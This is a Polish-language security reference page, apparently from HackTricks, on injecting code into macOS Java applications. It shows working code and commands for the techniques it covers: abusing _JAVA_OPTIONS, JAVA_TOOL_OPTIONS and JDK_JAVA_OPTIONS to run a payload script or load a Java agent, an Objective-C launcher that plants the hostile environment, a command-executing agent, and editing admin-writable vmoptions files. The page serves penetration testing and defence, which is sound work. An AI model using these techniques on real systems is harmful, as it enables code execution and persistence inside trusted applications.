# Injection aplikacji Java w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Znajdź aplikacje Java zainstalowane w systemie. Zauważono, że aplikacje Java w pliku **Info.plist** będą zawierać parametry Java zawierające ciąg **`java.`**, więc możesz go wyszukać:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Zmienna środowiskowa **`_JAVA_OPTIONS`** może służyć do wstrzykiwania dowolnych parametrów Java VM podczas uruchamiania aplikacji Java.<sup>[[1]](#references)</sup>

Stos uruchamiania Java rozpoznaje również dwie lepiej zdefiniowane zmienne o różnym zakresie działania:

- `JAVA_TOOL_OPTIONS` jest odczytywana podczas tworzenia VM, w tym w przypadku niektórych wbudowanych ścieżek uruchamiania, które nie przechodzą przez launcher `java`. Może wstrzykiwać opcje instrumentacji, takie jak `-javaagent`, `-agentlib` lub `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` jest dodawana przez launcher `java` na początku jego wiersza poleceń. Opcje wybierające klasę główną lub kończące działanie launchera są zabronione, ale `-javaagent` jest akceptowana.<sup>[[5]](#references)</sup>

Wszystkie trzy zmienne należy traktować jako mechanizmy kontroli wykonywania kodu JVM, gdy atakujący może również dostarczyć zgodny, możliwy do odczytu agent. `_JAVA_OPTIONS` jest szczegółem implementacyjnym HotSpot, dlatego należy ją weryfikować względem dokładnego dostawcy i wersji; `JAVA_TOOL_OPTIONS` lub `JDK_JAVA_OPTIONS` są preferowane podczas przenośnych testów.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Aby uruchomić go jako nowy proces, a nie jako proces potomny bieżącego terminala, możesz użyć:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Jednak ta technika wywołuje błąd w uruchomionej aplikacji. Bardziej skrytą alternatywą jest utworzenie Java agenta i użycie `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Utworzenie agenta przy użyciu **innej wersji Java** niż wersja używana przez aplikację może spowodować awarię zarówno agenta, jak i aplikacji.

Agent może znajdować się:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Aby skompilować agenta, uruchom:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Z `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Następnie wyeksportuj zmienną środowiskową i uruchom aplikację Java w następujący sposób:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## plik vmoptions

Ten plik obsługuje określanie **parametrów Java** podczas uruchamiania Java. Możesz użyć niektórych wcześniejszych technik, aby zmienić parametry Java i **sprawić, by proces wykonywał dowolne polecenia**.\
Co więcej, ten plik może także **dołączać inne pliki** za pomocą dyrektywy `include`, więc możesz również zmienić dołączony plik.

Ponadto niektóre aplikacje Java będą **ładować więcej niż jeden** plik `vmoptions`.

Niektóre aplikacje, takie jak Android Studio, wskazują w swoich **danych wyjściowych, gdzie szukają** tych plików:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Jeśli nie, możesz to sprawdzić za pomocą:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Zauważ, że Android Studio w tym przykładzie próbuje załadować **`/Applications/Android Studio.app.vmoptions`** — lokalizację, do której każdy użytkownik z grupy **`admin`** ma uprawnienia zapisu.

## References

- [1] [OpenJDK — parsowanie `_JAVA_OPTIONS` w `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — specyfikacja pakietu `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — konfigurowanie opcji JVM i właściwości platformy](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Launcher `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
